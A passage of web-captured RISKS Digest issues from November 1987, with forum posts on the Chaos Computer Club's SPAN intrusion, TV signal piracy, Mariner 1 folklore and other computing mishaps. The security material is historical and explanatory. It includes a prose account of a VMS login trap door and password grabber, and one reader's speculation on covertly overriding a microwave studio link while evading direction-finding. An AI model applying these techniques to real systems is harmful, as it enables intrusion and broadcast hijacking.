<A HREF="#subj1.1">
Dave Curry
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj2">
  Re: Video signal piracy hits WGN/WTTW 
</A>
<DD>
<A HREF="#subj2.1">
Will Martin
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj3">
  Logic Bombs; Centralized Auto Locking 
</A>
<DD>
<A HREF="#subj3.1">
P. T. Withington
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj4">
  Re: Mariner 1 
</A>
<DD>
<A HREF="#subj4.1">
Henry Spencer
</A><br>
<A HREF="#subj4.2">
 Mary Shaw
</A><br>
<A HREF="#subj4.3">
 Andrew Taylor
</A><br>
<A HREF="#subj4.4">
 Martin Ewing
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj5">
  Bank Transaction Control 
</A>
<DD>
<A HREF="#subj5.1">
Scott Dorsey
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj6">
  Re: Sudden acceleration revisited 
</A>
<DD>
<A HREF="#subj6.1">
Donald A Gworek
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj7">
  Re: CB radio and power 
</A>
<DD>
<A HREF="#subj7.1">
Jeffrey R Kell
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj8">
  More on Garage Doors 
</A>
<DD>
<A HREF="#subj8.1">
Brint Cooper
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj9">
  Train crash in Sweden 
</A>
<DD>
<A HREF="#subj9.1">
Matt Fichtenbaum
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj10">
  Re: L.A. Earthquake &amp; Telephone Service 
</A>
<DD>
<A HREF="#subj10.1">
Darin McGrew
</A><br>
</DL>

<A NAME="subj1"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj1.1">
More on NASA Hackers
</A>
</H3>
<address>
Dave Curry
&lt;<A HREF="mailto:davy@intrepid.ecn.purdue.edu ">
davy@intrepid.ecn.purdue.edu 
</A>&gt;
</address>
<i>
Tue, 24 Nov 87 10:36:28 EST
</i><PRE>

Some of this information has already been covered in RISKS and elsewhere,
but this article does a fairly good job of summing up both the original
problem and DEC's response to it.  (Dave)

Quoted without permission from "Digital Review", November 23, 1987, page 80.

  NASA Hackers: There's More to the Story
  Vin McLellan

    More details have come to light regarding the attack this summer on NASA's
  Space Physics Analysis Network (SPAN) by the young German hackers known in
  the European press as the "Chaos Computer Club".
    SPAN is a large, VAX-based network for scientists in the United States and
  other countries who wish to exchange unclassified information on post-flight
  space studies.  According to NASA officials, SPAN links about 800 computers
  in government, industry and academe.
    The SPAN network suddenly became well known after the Chaos hackers held
  a press conference in Hamburg, West Germany, earlier this fall to decry the
  lax VMS security that had allowed them to penetrate 20 different SPAN
  systems in Europe and the United States.
    NASA officials said the Chaos hackers had a considerably inflated idea of
  the value and confidentiality of the information stored on the SPAN systems.
  Although academic researchers may have labeled their files with eye-catching
  titles such as SDI_STUDIES, explained a NASA spokesman, there was no
  classified data stored on SPAN.
    The hackers were, however, able to exploit a flaw in the VMS access
  control system.  The problem was a bug in a VMS system software module
  called SECURESHR.EXE.  DEC first learned of it last year, in late December,
  according to Andy Goldstein, a senior engineer in DEC's VMS group.  The bug
  was subtle but serious, he said.  It allowed a sophisticated hacker to gain
  privileges from a normally unprivileged account.  DEC, said Goldstein, had a
  "fix" available by early February, "a little slower than usual because of
  the holidays."
    The Chaos hackers were able to exploit the delay between the early
  reports of the problem and the later distribution and implementation of
  DEC's corrective patch.  Although DEC's U.S. and European support centers
  had the patch available on request in February, Goldstein said, it wasn't
  until June or July that DEC issued a VMS "special release" to deal with the
  problem.  And even then, there were users who should have received the patch
  but didn't.
    The patch to SECURESHR.EXE "took a long time in coming to Europe,"
  complained Roy Omond, EDP manager at the European Microbiology Lab (EMBL) in
  Heidelberg, Germany.  At EMBL, the delay was costly.  "Before I had the
  chance to install the [SECURESHR] patch," Omond said, the Chaos Club had
  invaded his system.  When he realized what had happened, he broadcast an
  angry warning over SPAN and Arpanet.
    The Chaos hackers patched two VMS images, SHOW.EXE and LOGINOUT.EXE,
  explained Omond.  Those patches modified the system to install both a VMS
  "trap door," which let hackers access the system at any time using their own
  magic password, and a "password grabber" to collect and record the passwords
  of legitimate users.
    "Given that these were modifications to the trusted VMS software,"
  Goldstein noted ruefully, "there was nothing that you could do to defend
  against them."
    The LOGINOUT patch was "lethal," Omond said.  "Not only would it allow
  entry to any user name with the magic password, but it would also store
  valid passwords of all users logging in since the patch was installed."  The
  passwords were stored in the 12 bytes reserved for customer use in each User
  Authorization File (UAF) record.  The hackers have a small program that
  retrieves the user name/password pairs from the UAF, he said, neatly
  printing them out with an asterisk next to the name of each user with
  privileges.
    The Chaos code also corrupted the VMS accounting system, Omond said.
  Even when hackers were logged in, they would not appear on a job count or be
  listed with a SHOW USERS command.
    "They have cost us a lot of real money by using our X.25 connection to
  log in to several places all around the globe," Omond said.  "I have done my
  best to notify... the VAX sites that were accessed from our hacked system.
  I pray that no other damage has been done, and that I am not sitting on a
  time bomb."
    Omond hid neither his fear nor his anger.  He published the names of
  three people whom he accused of circulating the Chaos code - at least two of
  them were apparently employees at SPAN sites - in the hope, he said, that
  "someone somewhere will (a) be saved some hassle from them, and (b) might
  perform physical violence on them."

</PRE>
<A NAME="subj2"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj2.1">
 Re:  Video signal piracy hits WGN/WTTW
</A>
</H3>
<address>
Will Martin -- AMXAL-RI 
&lt;<A HREF="mailto:wmartin@ALMSA-1.ARPA">
wmartin@ALMSA-1.ARPA
</A>&gt;
</address>
<i>
Tue, 24 Nov 87 14:55:14 CST
</i><PRE>

For what its worth, the explanation of this incident that I saw on the evening
newscasts cited the method as being an overriding of the studio-transmitter
microwave link by a higher-effective-power transmitter. They illustrated this
with a drawing showing a vehicle with a microwave dish on it pulled up close
to the building atop which the transmitters are located, and that dish aimed
at the microwave receiving antennae mounted on that building. That could be
expected to put higher effective power into that receiver, and some form of
"capture effect" would allow this interfering signal to override the normal
legitimate input signal coming from the studio.

Of course, there are problems with this -- how would it have affected the
satellite-relay of WGN, for example, unless that is taken from an off-the-air
signal at the uplink site (which seems an unlikely arrangement)? Same about
the microwave land-relays for the PBS station; one would have thought both
of those would travel from the studios to various other sites directly.
(Perhaps, though, the high-building transmitter site is also a point of
origination for microwave relays to other places, and the pirate
overriding the input fed his signals into both the broadcast transmitter
and the outgoing microwave relay chains?)

The other main problem that occured to me is that it would probably be
too obvious and visible to do this. However, now that I think about it, could
it have been done from behind a glass window in another tall building
around that site? That could be just about undetectable if it is possible.
I've been at the transmitter end of such microwave studio-transmitter
links where the dish antenna was inside the room, facing directly at an
ordinary studs-and-plywood wall. That wall was essentially invisible at
those frequencies. (Since this was on top of a mountain, it sure made
maintenance easier, keeping the gear out of the weather!) So if one could
do this from an office or apartment in a nearby high-rise, behind a
curtain and through a closed window or glass wall, the only way to
locate it would be to DF the signal while it was actually transmitting. If
the pirate kept to short unpredictable bursts, this wouldn't be feasible.

I suppose the studio-transmitter link could be encrypted, but it would
still be subject to disruption by this technique. Though this would
prevent a pirate from getting a recognizable signal out over the
transmitter, his override would keep the legitimate signal from getting
through. They would have to go back to landline to avoid that.

Regards, Will Martin

   [Rich Kulawiec (rsk@s.cc.purdue.edu) submitted an article by John
   Camper (and Steve Daley) from the front page of the Chicago Tribune,
   24 Nov 87.  The article adds details to what Rich contributed to
   yesterday's <A HREF="/Risks/5.63.html">RISKS-5.63</A>, but nothing of real relevance to RISKS.
   Most of you probably saw similar write-ups in your local rags.  PGN]

</PRE>
<A NAME="subj3"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj3.1">
Logic Bombs; Centralized Auto Locking (<A HREF="/Risks/5.63.html">RISKS-5.63</A>)
</A>
</H3>
<address>
P. T. Withington 
&lt;<A HREF="mailto:PTW@DIAMOND.S4CC.Symbolics.COM">
PTW@DIAMOND.S4CC.Symbolics.COM
</A>&gt;
</address>
<i>
Tue, 24 Nov 87 12:24 EST
</i><PRE>
To: RISKS FORUM &lt;RISKS@KL.SRI.COM&gt;

Logic bombs et al.: The version I read [of the $70,000 salami attack] was
that, when discovered, the employee threatened to expose that the bank had
previously been funneling the same "roundoff" into its own profits and that
he went unpunished on his promise to keep quiet.  (On the other hand, the
"banks get rich on roundoff" tale is an old computer-fraud chestnut, ranking
right up there with the alligators in the NYC sewers.)

Centralized Auto Locking:  I know a friend whose battery went dead and hence
he couldn't unlock his car to open his hood!  (Of course the tow-truck
operator easily "jimmied" the door lock.)

</PRE>
<A NAME="subj4"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj4.1">
Re: Mariner 1
</A>
</H3>
<address>
&lt;<A HREF="mailto:utzoo!henry@uunet.UU.NET">
utzoo!henry@uunet.UU.NET
</A>&gt;
</address>
<i>
Mon, 23 Nov 87 16:03:01 EST
</i><PRE>

Oran W. Nicks, in "Far Travellers" (NASA SP-480) states that Mariner 1
failed because of a combination of two problems. ... And there was a hyphen
missing from the internal guidance software. ... Nicks was Director of Lunar
and Planetary Programs for NASA at the time, and I think we can assume that
he knows what he's talking about.

By the way, Mariner 1 was bound for Venus, not Mars.

</PRE>
<HR><H3><A NAME="subj4.2">
Mariner 1
</A>
</H3>
<address>
&lt;<A HREF="mailto:Mary.Shaw@sei.cmu.edu">
Mary.Shaw@sei.cmu.edu
</A>&gt;
</address>
<i>
Tuesday, 24 November 1987 15:31:50 EST
</i><PRE>

In SEN 5,2 (April 1980), a letter from the editor on p. 5 said that it was
Mariner 18 that was blown up because of a missing NOT in a program.  I
didn't note any further attribution.

    [You can't always trust those editors.  Besides, I'm not even
    sure there ever was a Mariner 18.  PGN]

In <A HREF="/Risks/3.41.html">RISKS-3.41</A> (August 1986), Alan Wexelblat reported that a Mariner probe to
Venus was lost because a period replaced a comma in a FORTRAN DO statement
(that is, something of the form DO 3 I=1,5 became DO3I = 1.5).  Wexelblat
attributed this report to an article in the Annals of the History of
Computing, 1984 (6) 1, page 6; I haven't followed the pointer back.
                                        Mary

   [Andrew Taylor &lt;ATAYLOR@ibm.com&gt; reminds us of the reference (in
   RISKS-4.1) to Software Engineering Notes v8,5 and v11,5.  The earlier
   one refers to the Annals of the History of Computing.  I was 
   hoping someone would turn up an independent source.  PGN]

</PRE>
<HR><H3><A NAME="subj4.3">
Mariner 1 or Apollo 11? (<A HREF="/Risks/5.63.html">RISKS-5.63</A>)
</A>
</H3>
<address>
Scott Dorsey
&lt;<A HREF="mailto:kludge@pyr.gatech.edu ">
kludge@pyr.gatech.edu 
</A>&gt;
</address>
<i>
Tue, 24 Nov 87 18:36:50 EST
</i><PRE>

    I heard that the famous "./," disaster caused the problem with the
onboard IBM 1800 on Apollo 11.  I heard this from a professor who teaches
Fortran, so I'm not so sure about the reliability of the source.  Anyone
else have information on either the Apollo or the Mariner problems?

Scott Dorsey   Kaptain_Kludge
SnailMail: ICS Programming Lab, Georgia Tech, Box 36681, Atlanta, Georgia 30332
Internet:  kludge@pyr.gatech.edu
uucp:	...!{decvax,hplabs,ihnp4,linus,rutgers,seismo}!gatech!gitpyr!kludge

</PRE>
<HR><H3><A NAME="subj4.4">
 Bank Transaction Control
</A>
</H3>
<address>
Martin Ewing
&lt;<A HREF="mailto:mse%Phobos.Caltech.Edu@DEImos.Caltech.Edu ">
mse%Phobos.Caltech.Edu@DEImos.Caltech.Edu 
</A>&gt;
</address>
<i>
Mon, 23 Nov 87 23:36:23 PST
</i><PRE>
To: risks%Phobos.Caltech.Edu@DEImos.Caltech.Edu

  "Our money is managed by people who care nothing for the details of
  an single transaction." [sic] (Grubbs, 4.61)

I had a friend who was employed as an old-fashioned bank teller a few
years ago.  From her report, it was an extraordinarily grinding, low-
paying job.  Error control consisted of making her personally
responsible for any cash shortages at the end of the day.  More than
one or two discrepant days and she would be out on the street.

Was this strict supervision to protect the customers, or to prevent
employee pilferage?  You decide. 

There seems to be no control in ATM systems that's quite comparable. Should
programmers, maintenance people or DP execs be forced to make good any system
losses? 

</PRE>
<A NAME="subj5"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj5.1">
Re: Sudden acceleration revisited
</A>
</H3>
<address>
Donald A Gworek
&lt;<A HREF="mailto:gworek@codas.att.com ">
gworek@codas.att.com 
</A>&gt;
</address>
<i>
24 Nov 87 13:32:45 GMT
</i><PRE>
Organization: AT&amp;T, Altamonte Springs, FL

Word of advice.  If you find yourself in sudden acceleration and the brakes
can't stop the car, try knocking the gearshift into neutral to disable the car.

Gearshifts are usually built with a feature where you can slip into neutral
just by pushing the shifter.

I learned this technique in driver's ed several years ago to avoid getting
into an accident if the gas pedal sticks to the floor.  The engine will
roar, but at least you'll be stationary or in control of the vehicle.

Don Gworek   { gatech, ihnp4, mtune }!codas!gworek

</PRE>
<A NAME="subj6"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj6.1">
     Re: CB radio and power
</A>
</H3>
<address>
Jeffrey R Kell 
&lt;<A HREF="mailto:JEFF%UTCVM.BITNET@CUNYVM.CUNY.EDU">
JEFF%UTCVM.BITNET@CUNYVM.CUNY.EDU
</A>&gt;
</address>
<i>
Mon, 23 Nov 87 14:29:52 EDT
</i><PRE>
To: RISKS@csl.sri.com

One addendum to the CB interference postings... CB is 11-meter, or more
accurately beginning at the high end of 26Mhz and through 27Mhz.  The big
hazard of illegal use of 10-meter amateur amplifiers on 11-meter signals
is you don't get the RFI reductions from the RF chokes and filters in the
amplifier that are tuned to 10-meter.  To defend the real amateur stations,
they probably aren't generating a 'ludicrous' amount of RFI; but using the
same rig at 11-meters loses the inherent filtering and you get lots of
noise.

You have probably noticed car radio interference quite often on the freeways
when the big trucks with 'alligator' radios pass by (depending on what
station you are tuned to).  The second harmonic of 26-27 Mhz signals rounds
out to 104-108 Mhz, or the upper half of commercial FM radio.

</PRE>
<A NAME="subj7"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj7.1">
 More on Garage Doors
</A>
</H3>
<address>
Brint Cooper 
&lt;<A HREF="mailto:abc@BRL.ARPA">
abc@BRL.ARPA
</A>&gt;
</address>
<i>
Tue, 24 Nov 87 9:28:11 EST
</i><PRE>

This morning's Baltimore Sun reports that when certain transmitters at Fort
Detrich were turned off, the garage door openers in residential Frederick,
Maryland, began opening again.  It continues that the Army remains
non-commital regarding its responsibility in the matter but notes that
Detrich is a major communications node for domestic and international traffic.

We should not miss the implied risk to computer systems (and, therefore, the
risk to those depending upon computer systems) if such phenomena continue.
Today, your garage door won't open; tomorrow, perhaps your PC won't boot.
                                             _Brint

</PRE>
<A NAME="subj8"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj8.1">
Train crash in Sweden [<A HREF="/Risks/5.60.html">RISKS-5.60</A>]
</A>
</H3>
<address>
Matt Fichtenbaum
&lt;<A HREF="mailto:genrad!mlf.UUCP@seismo.css.gov ">
genrad!mlf.UUCP@seismo.css.gov 
</A>&gt;
</address>
<i>

</i><PRE>
Date: 24 Nov 87 14:27:55 GMT
Organization: GenRad, Inc., Concord, Mass.

[More on the head-on train crash on 16 Nov 87 in Sweden -- in which nine
were killed and 120 injured.]  Neither train was to stop in the station; one
train, approaching the station at high (traveling) speed, suddenly found
itself shunted over to the opposing track.

According to Swedish shortwave news, construction machinery had
inadvertently cut a cable.  When the cable was repaired two conductors were
interchanged, causing the accident.  The news report didn't clarify whether
the cable error resulted in a switch being in the wrong position or a
signal's incorrectly indicating "ok to proceed."

    [I first read that as "two (train) conductors" were interchanged.  PGN]

</PRE>
<A NAME="subj9"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj9.1">
Re: L.A. Earthquake &amp; Telephone Service
</A>
</H3>
<address>
Darin McGrew
&lt;<A HREF="mailto:ibmpa!mcgrew@ucbvax.Berkeley.EDU ">
ibmpa!mcgrew@ucbvax.Berkeley.EDU 
</A>&gt;
</address>
<i>
Tue, 24 Nov 87 11:41:04 PST
</i><PRE>
Organization: IBM ACIS, PALO ALTO

&gt;... I thought "Lots of people calling relatives tied it
&gt;up", which was a factor, but The Institute reports that most of the
&gt;delays resulted because the quake knocked phone receivers off the hook.

It seems to me that a telephone handset resting in the cradle of a heavy
base with rubber feet stands less chance of ending up off the hook after an
earthquake than the new telephones that simply rest on a flat surface.

Could this be a risk of the simple lightweight telephones?
                                                                Darin

                      [Comment on the whole issue: Some of the contributions 
                      have been somewhat picky lately, and quite redundant.
                      Please observe the masthead guidelines.  PGN]
    
</PRE>

<IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"><P>
<A HREF="/Risks/5.63.html"><IMG SRC="/Images/Buttons/granite_left.gif" ALT="Previous Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/index.5.html"><IMG SRC="/Images/Buttons/granite_up.gif" ALT="Index" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/5.65.html"><IMG SRC="/Images/Buttons/granite_right.gif" ALT="Next Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks"><IMG SRC="/Images/Buttons/granite_i.gif" ALT="Info" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks.data/search.html"><IMG SRC="/Images/Buttons/granite_qm.gif" ALT="Searching" WIDTH="30" HEIGHT="30"></A>
<A HREF="mailto:risks@csl.sri.com"><IMG SRC="/Images/Buttons/granite_submit.gif" ALT="Submit Article" WIDTH="30" HEIGHT="30"></A>
<HR>
Report problems with the web pages to <A HREF="mailto:Lindsay.Marshall@newcastle.ac.uk">Lindsay.Marshall@newcastle.ac.uk</A>.
</BODY></HTML>
</DOC>
<DOC>
<DOCNO>WT11-B30-17</DOCNO>
<DOCOLDNO>IA012-000130-B022-194</DOCOLDNO>
<DOCHDR>
http://catless.ncl.ac.uk:80/Risks/5.65.html 128.240.150.127 19970217014313 text/html 13557
HTTP/1.0 200 OK
MIME-Version: 1.0
Date: Mon, 17 Feb 1997 01:41:39 GMT
Server: phttpd/0.99.72
Content-Type: text/html
</DOCHDR>
<HTML><HEAD><TITLE>The Risks Digest Volume 5: Issue 65</TITLE>
<LINK REL="Prev" HREF="/Risks/5.64.html">
<LINK REL="Up" HREF="/Risks/index.5.html">
<LINK REL="Next" HREF="/Risks/5.66.html">
<LINK REL="Help" HREF="/Risks">
<LINK REV="made" HREF="mailto:Lindsay.Marshall@newcastle.ac.uk">
</HEAD><BODY><HR>
<A HREF="/Risks/5.64.html"><IMG SRC="/Images/Buttons/granite_left.gif" ALT="Previous Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/index.5.html"><IMG SRC="/Images/Buttons/granite_up.gif" ALT="Index" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/5.66.html"><IMG SRC="/Images/Buttons/granite_right.gif" ALT="Next Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks"><IMG SRC="/Images/Buttons/granite_i.gif" ALT="Info" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks.data/search.html"><IMG SRC="/Images/Buttons/granite_qm.gif" ALT="Searching" WIDTH="30" HEIGHT="30"></A>
<A HREF="mailto:risks@csl.sri.com"><IMG SRC="/Images/Buttons/granite_submit.gif" ALT="Submit Article" WIDTH="30" HEIGHT="30"></A>
<HR>
<H1>The Risks Digest Volume 5: Issue 65</H1>
<H2> Wednesday 25 November 1987 </H2>
    <H3>Forum on Risks to the Public in Computers and Related Systems</H3>
    <I><A HREF="http://www.acm.org">ACM</A>
Committee on Computers and Public Policy, Peter G. Neumann, moderator</I>
<H2>Contents</H2><DL>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj1">
Mariner I and computer folklore 
</A>
<DD>
<A HREF="#subj1.1">
Jon Jacky
</A><br>
<A HREF="#subj1.2">
 Jim Horning
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj2">
  Computer-controlled train runs red light 
</A>
<DD>
<A HREF="#subj2.1">
Jon Jacky
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj3">
  Addressable CATV information 
</A>
<DD>
<A HREF="#subj3.1">
Ted Kekatos
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj4">
  A new legal first in Britain... 
</A>
<DD>
<A HREF="#subj4.1">
Gligor Tashkovich
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj5">
  The rm * controversy in unix.wizards 
</A>
<DD>
<A HREF="#subj5.1">
Charles Shub
</A><br>
</DL>

<A NAME="subj1"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj1.1">
Mariner I and computer folklore
</A>
</H3>
<address>
Jon Jacky
&lt;<A HREF="mailto:jon@june.cs.washington.edu ">
jon@june.cs.washington.edu 
</A>&gt;
</address>
<i>

</i><PRE>
Date: Tue, 24 Nov 87 22:13:08 PST

Mark Brader asks what really happened to Mariner 1, the Venus probe that had
to be blown up when it flew off course shortly after launch.  Some versions
of the story blame a missing hyphen, others blame a period substituted for a
comma.

I looked into this about a year ago.  I lost the trails of both versions
without finding a common ancestor.  Here is what I found out.  I hope some
reader can help.  The anecdote is told so often that someone really ought to
settle this once and for all.

  New York Times, July 23, 1962, p. 1 col. 2:  Atlas carrying Mariner I goes
  off course, destroyed by range safety officers

  New York Times, July 28, 1962, p. 1 col. 4: NASA, USAF, JPL announce Mariner
  I lost because flight control computer generated incorrect steering commands.
  Problem described as a "missing hyphen."

  New York Times, Aug 2, 1962, p. 24 col 5: Letter to the editor about Mariner
  I, calls for better computer programming practices.
  
  Mariner I loss attributed to substitution of period for comma in FORTRAN
  program: Henry S. Tropp, "FORTRAN Anecdotes," ANNALS OF THE HISTORY OF
  COMPUTING, Vol 6, No. 1, Jan 1984 pps. 61,62.    Tropp merely cites Jim
  Horning in ACM SOFTWARE ENGINEERING NOTES, 4(4) Oct. 1979 p. 6, who cites in 
  turn G.J. Myers, SOFTWARE RELIABILITY: PRINCIPLES AND PRACTICES, New York,
  John Wiley, 1976, p. 275.  

It looks like the missing hyphen version is much older.  I haven't been able
to trace the period-for-comma version to a printed source before Myers.
Still, I am not ready to accept the hyphen version as authoritative. I don't
have a copy of the NY TIMES story - I had to make notes from a microfilm
reader - but I recall that it seemed a bit confused, as if the reporter did
not quite follow the explanation he was given.  Also, I seem to recall
hearing the period-for-comma version long before Myers, when I was in
college around 1970.  Can anyone else offer an older citation?

A few leads I never followed up: obviously, Myers himself could to be
contacted to learn where he got the story.  I called IBM, credited in Myers'
book as his place of employment.  IBM said Myers had left some years ago and
they had no forwarding address.

Also, RISKS Volume 1 number 2, 28-Aug-1985, included a posting from Nicholas
Spies (Nicholas.Spies@CMU-CS-H.ARPA), in which he mentioned a memo about the
incident which his father had seen at the time.  No details were given in
that posting.  Nicholas, are you still there?  Can you help?

I think this matter would make an interesting case study for a folklorist. It
certainly has a lot of the aspects of the kind of urban folklore retold in the
book THE CHOKING DOBERMAN or an FOAF story ("this happened to a friend of a
friend").  In this case however, the tales are based on a real event in the
fairly recent past, so it should still be possible to find out what actually
happened.

It is interesting to note how a single incident gave rise to at least two
incompatible versions.  They now have an independent life - the RISKS index
in ACM SOFTWARE ENGINEERING NOTES, 12(1) Jan 1987 p. 23 cites both versions
as if they were two separate events.  The versions continue to fracture into
increasingly garbled variants.  The announcement for COMPASS '88 in
<A HREF="/Risks/5.62.html">RISKS-5.62</A> said "a rocket to Mars had to be destroyed...".  The index in SEN
also mentions "Mariner 18 - aborted due to missing NOT in program".  It is
not clear where this comes from; possibly another Mariner 1 mutation, or
maybe it is supposed to be Mariner 8, which my ILLUSTRATED ENCYCLOPEDIA OF
SPACE TECHNOLOGY (by Kenneth Gatland, Harmony, 1984) says "was lost during
launch."  Whatever, there was no Mariner 18 - the last in the Mariner series
was 10, a 1973 Venus flyby.
                                          - Jonathan Jacky
          [Jon, MANY THANKS. PGN]

</PRE>
<HR><H3><A NAME="subj1.2">
Mariner/Annals  [A little duplication and a little more clarification]
</A>
</H3>
<address>
Jim Horning
&lt;<A HREF="mailto:horning@src.DEC.COM ">
horning@src.DEC.COM 
</A>&gt;
</address>
<i>
Wed, 25 Nov 87 13:14:04 pst
</i><PRE>

The reference to ANNALS OF THE HISTORY OF COMPUTING, vol. 6, no. 1, should
be to page 61, not 6. However, it sheds little additional light: It quotes
my note in SEN October 1979, and my reference [3], G. J. Meyers, SOFTWARE
RELIABILITY: PRINCIPLES AND PRACTICES, John Wiley, 1976, p. 275. Meyers
doesn't cite his source, and I have never been able to get independent
confirmation.
                                      Jim H.

</PRE>
<A NAME="subj2"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj2.1">
Computer-controlled train runs red light
</A>
</H3>
<address>
Jon Jacky
&lt;<A HREF="mailto:jon@june.cs.washington.edu ">
jon@june.cs.washington.edu 
</A>&gt;
</address>
<i>

</i><PRE>
Date: Tue, 24 Nov 87 22:16:54 PST

From IEEE INSTITUTE, Dec. 1987, p. 8:

CHIPS TOO UNRELIABLE FOR TRAINS, SAY ENGINEERS by Gadi Kaplan

"..This was one of the main conclusions at the Symposium on Microprocessors
in Rail Transit, held in Pittsburgh on Sept. 14-16 by the Rail Systems Center
of Carnegie-Mellon University's Mellon Institute. ...

Technical experts agree that microprocessor-based systems are more flexible
in operation and much better at monitoring and fault diagnosis than the
relay-based systems they typically replace. ...

Symposium participants expressed concern, however, about the probablity
of failure of the microprocessor in an unsafe way as a result of inadequate
verification of its software.  A case in point was the failure, in February
1986, of a four-car train operated by the Washington Metropolitan Area Transit
Authority (WMATA) to stop at a red signal. ... "The failure could not be
replicated with the same cars at the same location under any condition with
.. prolonged field and laboratory testing," (a WMATA official) reported...

However, a more postive view was expressed by panelists from ... suppliers
of microprocessor-based systems for rail transport.  These panelists said
they were confident their software, which required years to develop, at
extensive costs, was verifiable and reliable."

(End of excerpts from IEEE INSTITUTE)
                                                  - Jonathan Jacky

</PRE>
<A NAME="subj3"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj3.1">
Addressable CATV systems
</A>
</H3>
<address>
&lt;<A HREF="mailto:ihnp4!ihuxv!tedk@ucbvax.Berkeley.EDU">
ihnp4!ihuxv!tedk@ucbvax.Berkeley.EDU
</A>&gt;
</address>
<i>
Wed, 25 Nov 87 07:39:33 PST
</i><PRE>

In my town, Oak Park, we have CATV provided by Cablevision of Oak Park. The
CATV control boxes have a serial number which is recorded (and phoned in to
the computer center) by the installer.

The digital signal broadcasted from the computer center (within the cable
company) provides the boxes with the date and time.  Niffy feature,
localized time base for all devices.  I have a button on my box for "display
time" which is displayed at the top of my screen.

But most importantly the digital signal transmits an individually addressed
(packet?) for each customer that provides a "matrix" of what each channel on
the box vectors to from the cable. I have noticed that the order of the
channels on the cable (itself) are different than what you see when you get
with the CATV box. The "Un-Authorized" channels, such as Playboy and HBO,
are _replaced_ with local cable guide (rather than the scambled signal and
sound). The CATV box stores the matrix even if un-plugged from power. When
the installer plugged in the box for the first time, all the channels where
un-authorized.

When I call the cable company for a "pay-per-view", they update the matrix
in my box to allow me to watch the program. The Matrix software in the box
might even have "HOW LONG" information in it.

Now, How do I get the localized time base to keep my Microware oven clock on
time ????? :-)

Ted G. Kekatos, AT&amp;T Bell Laboratories, Indian Hill South, IX-1F-460
Naperville &amp; Wheaton Roads - Naperville, Illinois. 60566 USA
backbone!ihnp4!ihuxv!tedk

</PRE>
<A NAME="subj4"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj4.1">
A new legal first in Britain...
</A>
</H3>
<address>
Gligor Tashkovich
&lt;<A HREF="mailto:gligor%lerouf.DEC@decwrl.dec.com ">
gligor%lerouf.DEC@decwrl.dec.com 
</A>&gt;
</address>
<i>
25 Nov 87 20:15
</i><PRE>

I heard somewhere that Britain is experiencing a new legal first:
  
Apparently, a computer consultant is on trial there and is charged with
criminal damage by planting "logic bombs" in his clients' software.
  
Does anyone else have more information?

</PRE>
<A NAME="subj5"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj5.1">
the rm * controversy in unix.wizards
</A>
</H3>
<address>
Charles Shub 
&lt;<A HREF="mailto:cdash@boulder.Colorado.EDU">
cdash@boulder.Colorado.EDU
</A>&gt;
</address>
<i>
Wed, 25 Nov 87 09:54:27 MST
</i><PRE>
Organization: University of Colorado at Colorado Springs

Yesterday, I got bit by rm [REMOVE]. I was remotely logged in to a system
over a network and had created a bunch of temp files. to delete them, I
naturally typed in "rm t*" only the %$*#&amp;^#@ network managed to drop the "t"
and you all know what happened then. It wasn't too bad because with the
archiving we do it was only 2 hours to get them back. Of course yesterday's
changes got lost and had to be redone. The point is that there are two
things a command interface could do:
  1) protect us from our own stupidity (I'm not convinced it should),
  2) protect us from "extended system" errors like dropping a character,
but I'm not sure how you separate the two.

cdash   aka cdash@boulder.colorado.edu    aka ...hao!boulder!cdash
